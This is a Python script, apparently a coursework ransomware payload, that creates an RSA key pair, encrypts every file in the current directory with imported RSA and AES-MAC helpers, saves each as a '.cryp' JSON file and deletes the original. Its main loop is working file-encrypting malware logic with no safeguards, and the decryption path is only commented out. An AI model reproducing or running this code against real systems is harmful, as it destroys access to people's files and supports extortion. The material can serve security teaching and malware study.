#Various imports 
import myEncryptionMAC
import myDecryptionMAC
import os
import constants
import RSAEncryptMAC
import json
from base64 import b64encode, b64decode
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

def main():
	#Check if key at path exists. If not, generate a key at said path
	default_key_path = "keys/rsa"
	if os.path.isfile(default_key_path + ".pem"):
		print("")
	else:	
		print("")		
		rsaKeyGen(default_key_path)
	#Locate current directory. fileNames holds a list of all files currently in the directory
	currentDir = os.getcwd()
	fileNames = os.listdir(currentDir)
	#Iterate through each file in fileNames.


	for name in fileNames:
		print (name)
	#If it is a file(not a directory) generate info from myRSAEncrypt
		if os.path.isfile(name):
			RSACipher, cipher, IV, tag, ext = RSAEncryptMAC.myRSAEncrypt(name, default_key_path + ".pub")
	###Pass info to jsonPack which will write that info to a JSON file, then delete original file			
			jsonPack(RSACipher, cipher, IV, tag, ext, name)
			os.remove(name)
	#RSACipher, cipher, IV, tag, ext, name = jsonUpack(decryptPath)
	#RSAEncryptMac.myRSADecrypt(RSACipher, cipher, IV, tag, ext,name)

#End of Main
def rsaKeyGen(RSA_key_path):
	#Generate private key
	rsaPrivKey = rsa.generate_private_key(public_exponent=65537, key_size = 2048, backend = default_backend())
#Generate public key from privatekey
	rsaPubKey = rsaPrivKey.public_key()
#Serialize keys for writing to file
	privPem = rsaPrivKey.private_bytes(encoding=serialization.Encoding.PEM, format = serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption())
	pubPem = rsaPubKey.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
	#Split path from file name
	kPath, kName = os.path.split(RSA_key_path)
#Check if path is a directory, create it if it does not exist
	if kPath != "":
		os.makedirs(kPath, exist_ok=True)
#if there is no tail, add "default" to key path for key gen 
	if kName == "":
		print ("No name entered. default.pem, default.pub will be created in chosen directory")
		RSA_key_path = RSA_key_path + "default"
	#Write keys to separate files
	createFile = open(RSA_key_path+".pem", "wb")
	createFile.write(privPem)
	createFile.close()
	createFile = open(RSA_key_path+".pub", "wb")
	createFile.write(pubPem)
	createFile.close()

def jsonPack(Enckey, cipher, IV, tag, ext, fileName):
	#Name will be the same as the orignal file
	fileEncrypted = fileName + ".cryp"
	#Create new file and write ciphertext and related data to it
	fEncrypt = open(fileEncrypted,"w")
	fileInfo = {}
	fileInfo["key"] = b64encode(Enckey).decode('utf-8')
	fileInfo["cipher"] = b64encode(cipher).decode('utf-8')
	fileInfo["iv"] = b64encode(IV).decode('utf-8')
	fileInfo["tag"] = b64encode(tag).decode('utf-8')
	fileInfo["ext"] = ext
	fileInfo["name"] = fileName
	#Dump (write) info into file
	json.dump(fileInfo, fEncrypt)
	fEncrypt.close()
def jsonUnpack(filepath):
	#Open file, load and return different values
	jsonFile = open(filepath, 'r')
	jLoad = json.load(jsonFile)
	jsonFile.close()
	jKey = b64decode(jLoad["key"])
	jCipher = b64decode(jLoad["cipher"])
	jIV = b64decode(jLoad["iv"])
	jExt = jLoad["ext"]
	jTag = b64decode(jLoad["tag"])
	jName = jLoad["name"]
	return jKey, jCipher, jIV, jTag, jExt, jName
if __name__=="__main__":
	main()
